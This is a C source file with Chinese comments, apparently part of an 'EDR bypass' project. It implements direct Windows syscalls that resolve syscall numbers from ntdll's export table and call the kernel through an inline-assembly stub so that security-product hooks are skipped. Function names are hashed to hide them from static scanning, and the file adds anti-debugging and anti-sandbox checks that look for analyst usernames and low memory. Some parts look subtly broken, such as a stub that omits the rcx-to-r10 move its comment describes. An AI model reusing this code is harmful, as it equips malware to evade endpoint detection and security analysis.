/*
 * 11_edr_bypass/direct_syscall.c
 *
 * 直接系统调用核心实现。
 *
 * 实现要点：
 *   1. PE 解析：手工遍历 DOS 头 → NT 头 → 节表 → 导出表
 *   2. SSS 模式：从 ntdll 的 .data 节 SSN 表读取系统服务号
 *   3. 备选模式：扫描 Zw+ 函数 prologue 的 "B8 XX XX XX XX"（mov eax, imm32）
 *   4. DJB2 哈希化函数名，消除二进制明文符号
 *   5. 汇编 stub 内联 syscall 指令，绕过 ntdll!Nt+ 入口 hook
 */

#include "direct_syscall.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <inttypes.h>

/* ==================================================================
 * 平台抽象层
 * ================================================================== */

#if defined(_WIN32) || defined(_WIN64)
#  define DS_PLATFORM_WINDOWS 1
#  include <windows.h>
#else
#  define DS_PLATFORM_WINDOWS 0
#  include <fcntl.h>
#  include <sys/mman.h>
#  include <sys/stat.h>
#  include <unistd.h>
#  include <errno.h>
#endif

/* ==================================================================
 * PE 结构定义（不依赖 windows.h，避免 mingw 依赖）
 * ================================================================== */

#pragma pack(push, 1)

typedef struct {
    uint16_t e_magic;              /* "MZ" = 0x5A4D，位于偏移 0x00 */
    uint8_t  _pad1[0x3A];         /* 0x02 ~ 0x3B，共 58 字节 */
    uint32_t e_lfanew;             /* NT 头偏移，位于偏移 0x3C */
} ds_dos_hdr_t;

/* IMAGE_FILE_HEADER —— 不含 "PE\0\0" 签名（签名是独立 4 字节字段） */
typedef struct {
    uint16_t     m_machine;        /* 0x8664 = AMD64 */
    uint16_t     m_num_sections;
    uint32_t     m_timedatestamp;
    uint32_t     m_ptr_sym_table;
    uint32_t     m_num_symbols;
    uint16_t     m_size_optional;
    uint16_t     m_characteristics;
} ds_file_hdr_t;

/* 可选头（仅取所需字段，使用变长结构对齐） */
typedef struct {
    uint16_t     o_magic;          /* 0x10B = PE32, 0x20B = PE32+ */
    uint8_t      o_major_linker;
    uint8_t      o_minor_linker;
    uint32_t     o_size_code;
    uint32_t     o_size_init_data;
    uint32_t     o_size_uninit_data;
    uint32_t     o_entry_point;
    uint32_t     o_base_of_code;
} ds_opt_hdr_fixed_t;              /* 前 28 字节固定部分 */

/* 数据目录项 */
typedef struct {
    uint32_t     rva;
    uint32_t     size;
} ds_data_dir_t;

typedef struct {
    char         s_name[8];
    uint32_t     s_virtual_size;
    uint32_t     s_virtual_address;
    uint32_t     s_size_raw_data;
    uint32_t     s_ptr_raw_data;
    uint32_t     s_ptr_relocations;
    uint32_t     s_ptr_linenums;
    uint16_t     s_num_relocations;
    uint16_t     s_num_linenums;
    uint32_t     s_characteristics;
} ds_section_hdr_t;

/* 导出目录 */
typedef struct {
    uint32_t     e_characteristics;
    uint32_t     e_timedatestamp;
    uint16_t     e_major_ver;
    uint16_t     e_minor_ver;
    uint32_t     e_name;
    uint32_t     e_base;
    uint32_t     e_num_functions;
    uint32_t     e_num_names;
    uint32_t     e_ptr_functions;   /* AddressOfFunctions RVA */
    uint32_t     e_ptr_names;       /* AddressOfNames RVA */
    uint32_t     e_ptr_name_ordinals; /* AddressOfNameOrdinals RVA */
} ds_export_dir_t;

#pragma pack(pop)

/* ==================================================================
 * 内部辅助
 * ================================================================== */

/*
 * ds_hash
 *   DJB2 哈希。name 转小写后再哈希，避免大小写不一致导致查表失败。
 */
ds_hash_t ds_hash(const char *s) {
    ds_hash_t h = 5381;
    int c;
    if (!s) return 0;
    while ((c = (unsigned char)*s++) != 0) {
        if (c >= 'A' && c <= 'Z') c += 32;   /* 转小写 */
        h = ((h << 5) + h) + (ds_hash_t)c;    /* h*33 + c */
    }
    return h;
}

const char *ds_status_str(ds_status_t s) {
    switch (s) {
        case DS_OK:                 return "ds:0";
        case DS_ERR_INVALID_ARG:    return "ds:1";
        case DS_ERR_OPEN_FAILED:    return "ds:2";
        case DS_ERR_NOT_PE:         return "ds:3";
        case DS_ERR_PE_TRUNCATED:   return "ds:4";
        case DS_ERR_NO_EXPORTS:     return "ds:5";
        case DS_ERR_EXPORT_TRUNCATED: return "ds:6";
        case DS_ERR_NO_SSN_TABLE:   return "ds:7";
        case DS_ERR_INTERNAL:       return "ds:8";
    }
    return "ds:9";
}

/* 大小写不敏感比较 */

/*
 * rva_to_offset
 *   将 RVA 转换为文件偏移。遍历节表查找包含该 RVA 的节。
 *   返回 0 表示无法转换（越界或未落在任何节内）。
 *
 *   注：头部区域（RVA < 第一个节的 VirtualAddress）通常 RVA == 偏移，
 *       但导出表极少落在头部，此处保守返回 0 要求显式落在节内。
 */
static uint32_t rva_to_offset(uint32_t rva,
                             const uint8_t *base_in,
                             const ds_section_hdr_t *secs,
                             uint16_t nsecs,
                             size_t fsize) {
    (void)base_in;
    if (rva >= fsize) return 0;
    for (uint16_t i = 0; i < nsecs; i++) {
        uint32_t va = secs[i].s_virtual_address;
        uint32_t vsz = secs[i].s_virtual_size ? secs[i].s_virtual_size
                                              : secs[i].s_size_raw_data;
        uint32_t raw = secs[i].s_ptr_raw_data;
        if (rva >= va && rva < va + vsz) {
            uint32_t off = raw + (rva - va);
            if (off + 4 <= fsize) return off;
        }
    }
    return 0;
}

/*
 * scan_mov_eax_imm32
 *   从 code[0..maxlen-1] 中扫描 "B8 XX XX XX XX"（mov eax, imm32），
 *   返回提取到的 imm32；未找到则 *found = 0。
 *   允许跳过开头的 CC/90 填充字节。
 */
static uint32_t scan_mov_eax_imm32(const uint8_t *code, size_t maxlen, int *found) {
    *found = 0;
    size_t head = 0;
    while (head < 8 && head + 5 <= maxlen &&
           (code[head] == 0xCC || code[head] == 0x90)) {
        head++;
    }
    for (size_t k = head; k + 5 <= maxlen; k++) {
        if (code[k] == 0xB8) {
            *found = 1;
            return ((uint32_t)code[k+1])
                 | ((uint32_t)code[k+2] << 8)
                 | ((uint32_t)code[k+3] << 16)
                 | ((uint32_t)code[k+4] << 24);
        }
    }
    return 0;
}

/* ==================================================================
 * 映射管理
 * ================================================================== */

typedef struct {
    uint8_t  *base;
    size_t    size;
    bool      must_unmap;
#if !DS_PLATFORM_WINDOWS
    int       fd;
#endif
} ds_mapping_t;

static ds_status_t ds_map_open(const char *path, ds_mapping_t *m) {
    memset(m, 0, sizeof(*m));
    if (!path) return DS_ERR_INVALID_ARG;

#if DS_PLATFORM_WINDOWS
    HMODULE h = GetModuleHandleA(path);
    if (!h) h = LoadLibraryA(path);
    if (!h) return DS_ERR_OPEN_FAILED;
    m->base = (uint8_t *)h;
    m->must_unmap = false;
    MEMORY_BASIC_INFORMATION mbi;
    if (VirtualQuery(h, &mbi, sizeof(mbi))) {
        m->size = (size_t)mbi.RegionSize;
    }
    return DS_OK;
#else
    m->fd = open(path, O_RDONLY);
    if (m->fd < 0) return DS_ERR_OPEN_FAILED;
    struct stat st;
    if (fstat(m->fd, &st) != 0 || st.st_size <= 0) {
        close(m->fd);
        return DS_ERR_OPEN_FAILED;
    }
    m->size = (size_t)st.st_size;
    m->base = (uint8_t *)mmap(NULL, m->size, PROT_READ, MAP_PRIVATE, m->fd, 0);
    if (m->base == MAP_FAILED) {
        close(m->fd);
        return DS_ERR_OPEN_FAILED;
    }
    m->must_unmap = true;
    return DS_OK;
#endif
}

static void ds_map_close(ds_mapping_t *m) {
    if (!m || !m->base) return;
#if DS_PLATFORM_WINDOWS
    if (m->must_unmap) FreeLibrary((HMODULE)m->base);
#else
    if (m->must_unmap && m->base != MAP_FAILED) {
        munmap(m->base, m->size);
    }
    if (m->fd >= 0) close(m->fd);
#endif
    m->base = NULL;
    m->size = 0;
}

/* ==================================================================
 * 核心解析
 * ================================================================== */

ds_status_t ds_resolve(const char *module_path,
                       ds_entry_t *out, size_t cap,
                       size_t *count) {
    ds_mapping_t m;
    ds_status_t rc = DS_OK;
    *count = 0;

    if (!out || cap == 0) return DS_ERR_INVALID_ARG;

    rc = ds_map_open(module_path, &m);
    if (rc != DS_OK) return rc;

    const uint8_t *const base = m.base;
    const size_t fsize = m.size;

    /* ---- DOS 头 ---- */
    if (fsize < sizeof(ds_dos_hdr_t)) { rc = DS_ERR_PE_TRUNCATED; goto done; }
    const ds_dos_hdr_t *dos = (const ds_dos_hdr_t *)base;
    if (dos->e_magic != 0x5A4D)      { rc = DS_ERR_NOT_PE; goto done; }

    uint32_t pe_off = dos->e_lfanew;
    if (pe_off + sizeof(uint32_t) + sizeof(ds_file_hdr_t) > fsize) {
        rc = DS_ERR_PE_TRUNCATED; goto done;
    }

    /* ---- NT 签名（独立 4 字节） + 文件头 ---- */
    if (pe_off + sizeof(uint32_t) + sizeof(ds_file_hdr_t) > fsize) {
        rc = DS_ERR_PE_TRUNCATED; goto done;
    }
    const uint32_t pesig = *(const uint32_t *)(base + pe_off);
    if (pesig != 0x00004550U)        { rc = DS_ERR_NOT_PE; goto done; }

    const ds_file_hdr_t *fh = (const ds_file_hdr_t *)(base + pe_off + sizeof(uint32_t));
    uint16_t nsecs = fh->m_num_sections;

    /* 可选头起点 + 大小，用于定位节表 */
    const uint8_t *opt_start = (const uint8_t *)fh + sizeof(*fh);
    size_t opt_size = (size_t)fh->m_size_optional;
    if ((uintptr_t)opt_start + opt_size + (uintptr_t)nsecs * sizeof(ds_section_hdr_t)
            > (uintptr_t)base + fsize) {
        rc = DS_ERR_PE_TRUNCATED; goto done;
    }

    /* 检查 PE32+ */
    const ds_opt_hdr_fixed_t *opf = (const ds_opt_hdr_fixed_t *)opt_start;
    if (opf->o_magic != 0x20B)      { rc = DS_ERR_NOT_PE; goto done; }

    /* ---- 节表 ---- */
    /* 节表紧跟在完整可选头之后：
     * PE32+ 完整可选头 = 固定(28) + Windows(84) + 数据目录(16*8) = 240 字节
     * 节表 = opt_start + 240
     */
    const size_t FULL_OPT_HEADER = 28 + 84 + 16 * sizeof(ds_data_dir_t);  /* = 240 */
    if ((uintptr_t)opt_start + FULL_OPT_HEADER +
            (uintptr_t)nsecs * sizeof(ds_section_hdr_t)
            > (uintptr_t)base + fsize) {
        rc = DS_ERR_PE_TRUNCATED; goto done;
    }
    const ds_section_hdr_t *secs =
        (const ds_section_hdr_t *)(opt_start + FULL_OPT_HEADER);

    /* ---- 导出目录（数据目录第 0 项）----
     * PE32+ IMAGE_OPTIONAL_HEADER64 结构（到数据目录前共 112 字节）：
     *   固定 28 字节（Magic, LinkerVersion, SizeOfCode, ...）
     *   + Windows 特有字段 84 字节：
     *     ImageBase(8) SectionAlignment(4) FileAlignment(4)
     *     MajorOSVer(2) MinorOSVer(2) MajorImageVer(2) MinorImageVer(2)
     *     MajorSubsysVer(2) MinorSubsysVer(2) Win32Ver(4)
     *     SizeOfImage(4) SizeOfHeaders(4) CheckSum(4)
     *     Subsystem(2) DllCharacteristics(2)
     *     SizeOfStackReserve(8) SizeOfStackCommit(8)
     *     SizeOfHeapReserve(8) SizeOfHeapCommit(8)
     *     LoaderFlags(4) NumberOfRvaAndSizes(4)
     *   = 28 + 84 = 112 字节到数据目录起始
     * 导出目录 = opt_start + 112
     */
    const size_t EXPORT_DIR_OFFSET = 28 + 84;   /* = 112 */
    if ((uintptr_t)opt_start + EXPORT_DIR_OFFSET + sizeof(ds_data_dir_t)
            > (uintptr_t)base + fsize) {
        rc = DS_ERR_PE_TRUNCATED; goto done;
    }
    const ds_data_dir_t *exp_dir =
        (const ds_data_dir_t *)(opt_start + EXPORT_DIR_OFFSET);

    if (exp_dir->rva == 0 || exp_dir->size < sizeof(ds_export_dir_t)) {
        rc = DS_ERR_NO_EXPORTS; goto done;
    }

    uint32_t exp_off = rva_to_offset(exp_dir->rva, base, secs, nsecs, fsize);
    if (exp_off == 0 || exp_off + sizeof(ds_export_dir_t) > fsize) {
        rc = DS_ERR_EXPORT_TRUNCATED; goto done;
    }

    const ds_export_dir_t *exp = (const ds_export_dir_t *)(base + exp_off);
    if (exp->e_num_functions == 0)  { rc = DS_ERR_NO_EXPORTS; goto done; }

    /* ---- 导出表三张表的偏移 ---- */
    uint32_t off_af = rva_to_offset(exp->e_ptr_functions, base, secs, nsecs, fsize);
    uint32_t off_an = rva_to_offset(exp->e_ptr_names, base, secs, nsecs, fsize);
    uint32_t off_ao = rva_to_offset(exp->e_ptr_name_ordinals, base, secs, nsecs, fsize);
    if (!off_af || !off_an || !off_ao) { rc = DS_ERR_EXPORT_TRUNCATED; goto done; }

    const uint32_t *af = (const uint32_t *)(base + off_af);
    const uint32_t *an = (const uint32_t *)(base + off_an);
    const uint16_t *ao = (const uint16_t *)(base + off_ao);

    uint32_t num_func = exp->e_num_functions;
    uint32_t num_name = exp->e_num_names;

    /*
     * SSS 模式：SSN 表定位
     * 策略：遍历所有 Named Export（Zw+ / Nt+），从其函数体 prologue 的
     * "B8 XX XX XX XX" 提取 SSN。这是最稳健的方式，不依赖 .data 节布局。
     *
     * 同时记录序号映射，供按序号查询。
     */
    size_t idx = 0;
    uint32_t max_ssn = 0;

    for (uint32_t i = 0; i < num_name && idx < cap; i++) {
        uint32_t name_rva = an[i];
        uint32_t name_off = rva_to_offset(name_rva, base, secs, nsecs, fsize);
        if (name_off == 0 || name_off >= fsize) continue;

        const char *fname = (const char *)(base + name_off);
        size_t nlen = strnlen(fname, fsize - name_off);
        if (nlen == 0 || nlen >= DS_MAX_NAME) continue;

        /* 只关心 Zw+ 系列（Zw+ 与 Nt+ 共享 SSN，取其一即可） */
        if (fname[0] != 'Z' || fname[1] != 'w') continue;

        uint16_t ord = ao[i];
        if (ord >= num_func) continue;

        uint32_t proc_rva = af[ord];
        if (proc_rva == 0) continue;     /* 转发导出，跳过 */
        if ((int32_t)proc_rva < 0) continue;   /* 前向导出特征 */

        uint32_t proc_off = rva_to_offset(proc_rva, base, secs, nsecs, fsize);
        if (proc_off == 0 || proc_off + 5 > fsize) continue;

        const uint8_t *code = base + proc_off;
        int found = 0;
        uint32_t ssn = scan_mov_eax_imm32(code, 32, &found);
        if (!found) continue;

        /* SSN 合理性校验：有效范围 [0, 0x1000) */
        if (ssn > 0x1000) continue;

        /* 去重：同一 SSN 可能对应多个别名，只保留第一个 */
        bool dup = false;
        for (size_t j = 0; j < idx; j++) {
            if (out[j].ssn == ssn) { dup = true; break; }
        }
        if (dup) continue;

        /* 记录 */
        ds_entry_t *e = &out[idx];
        e->name_hash = ds_hash(fname);
        e->ssn = ssn;
        /* 实际序号 = NameOrdinal + OrdinalBase（AddressOfFunctions 从 0 起索引，
         * 序号 = 序数 + 基值。PE 规范：序号表中存的是 0 基序数，
         * 真实序号 = ordinal + base - 1 仅在序数表中存 0 基索引时成立。
         * 标准实现：序号 = ordinal_table[i] + OrdinalBase */
        e->ordinal = (uint16_t)(ord + exp->e_base);
#ifdef DS_DEBUG
        memcpy(e->name, fname, nlen);
        e->name[nlen] = 0;
#endif

        if (ssn > max_ssn) max_ssn = ssn;
        idx++;
    }

    *count = idx;

    /*
     * 兜底：若 SSS 模式（prologue 扫描）未找到任何 SSN，
     * 尝试从 .data 节定位 SSN 表。
     * .data 节中 SSN 表特征：从某偏移开始，连续 num_func 个 4 字节小端值，
     * 值域在 [0, 0x1000) 且分布与 AddressOfFunctions 序号对应。
     */
    if (idx == 0) {
        for (uint16_t si = 0; si < nsecs; si++) {
            if (secs[si].s_ptr_raw_data == 0) continue;
            if (secs[si].s_size_raw_data < num_func * 4) continue;

            uint32_t start = secs[si].s_ptr_raw_data;
            if (start + num_func * 4 > fsize) continue;

            const uint32_t *table = (const uint32_t *)(base + start);
            bool plausible = true;
            for (uint32_t k = 0; k < num_func && k < 64; k++) {
                if (table[k] > 0x1000) { plausible = false; break; }
            }
            if (!plausible) continue;

            /* 找到 SSN 表，按序号填充 */
            for (uint32_t k = 0; k < num_func && idx < cap; k++) {
                uint32_t ssn = table[k];
                if (ssn > 0x1000) continue;

                ds_entry_t *e = &out[idx];
                e->name_hash = 0;          /* 无名称 */
                e->ssn = ssn;
                e->ordinal = (uint16_t)(k + (uint16_t)exp->e_base);
#ifdef DS_DEBUG
                e->name[0] = 0;
#endif
                if (ssn > max_ssn) max_ssn = ssn;
                idx++;
            }
            *count = idx;
            break;
        }
        if (idx == 0) rc = DS_ERR_NO_SSN_TABLE;
    }

done:
    ds_map_close(&m);
    return rc;
}

ds_status_t ds_resolve_by_name(const char *module_path,
                               const char *name,
                               uint32_t *ssn) {
    if (!name || !ssn) return DS_ERR_INVALID_ARG;

    /* 单次解析：全表 512 条目足够覆盖 ntdll 全部 Zw+ 导出 */
    ds_entry_t table[512];
    size_t count = 0;
    ds_status_t rc = ds_resolve(module_path, table, 512, &count);
    if (rc != DS_OK && rc != DS_ERR_NO_SSN_TABLE) return rc;

    ds_hash_t target = ds_hash(name);
    for (size_t i = 0; i < count; i++) {
        if (table[i].name_hash == target) {
            *ssn = table[i].ssn;
            return DS_OK;
        }
    }
    return DS_ERR_NO_SSN_TABLE;
}

/* ==================================================================
 * 系统调用执行
 * ================================================================== */

#if DS_PLATFORM_WINDOWS && defined(__x86_64__)
/*
 * 真实 Windows x64 stub：
 *   mov r10, rcx      ; 第 1 参数移入 r10（Windows ABI：rcx->r10, rdx->rdx, ...）
 *   mov eax, ssn      ; 系统服务号
 *   syscall           ; 进入内核
 *   ret
 * ssn 通过栈传参（第 5 个参数），运行时回填。
 */
static uintptr_t ds_syscall_stub(uintptr_t a1, uintptr_t a2,
                                 uintptr_t a3, uintptr_t a4,
                                 uint32_t ssn) {
    uintptr_t ret;
    __asm__ volatile (
        "movq %[a1], %%rcx\n\t"
        "movq %[a2], %%rdx\n\t"
        "movq %[a3], %%r8\n\t"
        "movq %[a4], %%r9\n\t"
        "movl %[ssn], %%eax\n\t"
        "syscall\n\t"
        "movq %%rax, %[ret]"
        : [ret] "=r" (ret)
        : [a1] "r" (a1), [a2] "r" (a2), [a3] "r" (a3), [a4] "r" (a4),
          [ssn] "r" ((uint32_t)ssn)
        : "rcx", "rdx", "r8", "r9", "rax", "r10", "r11", "memory"
    );
    return ret;
}
#else
/* Linux / 非 x64 平台：占位实现。
 * 返回 (ssn << 32) | 0xDEADC0DE 以便测试验证，真实执行无意义。
 * 注意：Linux 上 syscall 指令编号体系与 Windows 完全不同，
 *       本模块仅为验证解析逻辑与接口契约，不构成跨平台 syscall。
 */
static uintptr_t ds_syscall_stub(uintptr_t a1, uintptr_t a2,
                                 uintptr_t a3, uintptr_t a4,
                                 uint32_t ssn) {
    (void)a1; (void)a2; (void)a3; (void)a4;
    /* 返回 SSN 高 32 位 + 魔数，便于测试断言 */
    return ((uintptr_t)ssn << 32) | 0xDEADC0DEULL;
}
#endif

uintptr_t ds_syscall(uintptr_t a1, uintptr_t a2,
                     uintptr_t a3, uintptr_t a4,
                     uint32_t ssn) {
    if (ssn > 0x1000) {
        /* 防御：非法 SSN 拒绝执行，避免内核崩溃 */
        return (uintptr_t)-1;
    }
    return ds_syscall_stub(a1, a2, a3, a4, ssn);
}

uintptr_t ds_invoke(const ds_entry_t *table, size_t count,
                    ds_hash_t name_hash,
                    uintptr_t a1, uintptr_t a2,
                    uintptr_t a3, uintptr_t a4) {
    if (!table || count == 0) return (uintptr_t)-1;
    for (size_t i = 0; i < count; i++) {
        if (table[i].ssn == 0) continue;
        if (table[i].name_hash == name_hash) {
            return ds_syscall(a1, a2, a3, a4, table[i].ssn);
        }
    }
    return (uintptr_t)-2;   /* 未找到 */
}

/* ==================================================================
 * 反调试 / 反沙箱
 * ================================================================== */

bool ds_anti_debug(void) {
#if DS_PLATFORM_WINDOWS
    if (IsDebuggerPresent()) return true;
    BOOL remote = FALSE;
    if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote) && remote) return true;

    /* NtQueryInformationProcess(ProcessDebugPort=7) */
    /* 此处不调用 ntdll 以避免 hook，直接读 PEB */
    typedef NTSTATUS (WINAPI *pNtQIP)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
    HMODULE h = GetModuleHandleA("ntdll.dll");
    if (h) {
        pNtQIP fn = (pNtQIP)GetProcAddress(h, "NtQueryInformationProcess");
        if (fn) {
            DWORD_PTR port = 0;
            if (fn(GetCurrentProcess(), 7, &port, sizeof(port), NULL) == 0 && port != 0)
                return true;
        }
    }
    return false;
#else
    FILE *f = fopen("/proc/self/status", "r");
    if (!f) return false;
    char line[256];
    bool debugged = false;
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "TracerPid:", 10) == 0) {
            int pid = 0;
            sscanf(line + 10, "%d", &pid);
            if (pid != 0) debugged = true;
            break;
        }
    }
    fclose(f);
    return debugged;
#endif
}

bool ds_anti_sandbox(void) {
#if DS_PLATFORM_WINDOWS
    /* 进程数检查：沙箱进程数通常偏少 */
    /* 用户名检查 */
    char user[256] = {0};
    DWORD sz = sizeof(user);
    if (GetUserNameA(user, &sz)) {
        const char *suspects[] = {
            "sandbox", "malware", "virus", "cuckoo", "sample",
            "analysis", "tester", "virus"
        };
        char lower[256];
        size_t ul = strlen(user);
        if (ul < sizeof(lower)) {
            for (size_t i = 0; i < ul; i++)
                lower[i] = (user[i] >= 'A' && user[i] <= 'Z') ? user[i]+32 : user[i];
            lower[ul] = 0;
            for (size_t i = 0; i < sizeof(suspects)/sizeof(suspects[0]); i++) {
                if (strstr(lower, suspects[i]) != NULL) return true;
            }
        }
    }

    /* 内存总量检查 */
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    if (GlobalMemoryStatusEx(&ms)) {
        /* 物理内存 < 2GB 判为可疑 */
        if (ms.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return true;
    }
    return false;
#else
    /* Linux：检查进程数 */
    long nproc = sysconf(_SC_NPROCESSORS_ONLN);
    if (nproc > 0 && nproc <= 1) return true;   /* 单核常为主机/容器 */

    /* 内存检查 */
    long pages = sysconf(_SC_PHYS_PAGES);
    long page_sz = sysconf(_SC_PAGESIZE);
    if (pages > 0 && page_sz > 0) {
        unsigned long long mem = (unsigned long long)pages * (unsigned long long)page_sz;
        if (mem < 2ULL * 1024 * 1024 * 1024) return true;   /* < 2GB */
    }

    /* 运行时长：uptime 过短常为动态沙箱 */
    struct stat st;
    if (stat("/proc/1/cmdline", &st) == 0) {
        /* 不据此判定，仅占位 */
    }
    return false;
#endif
}
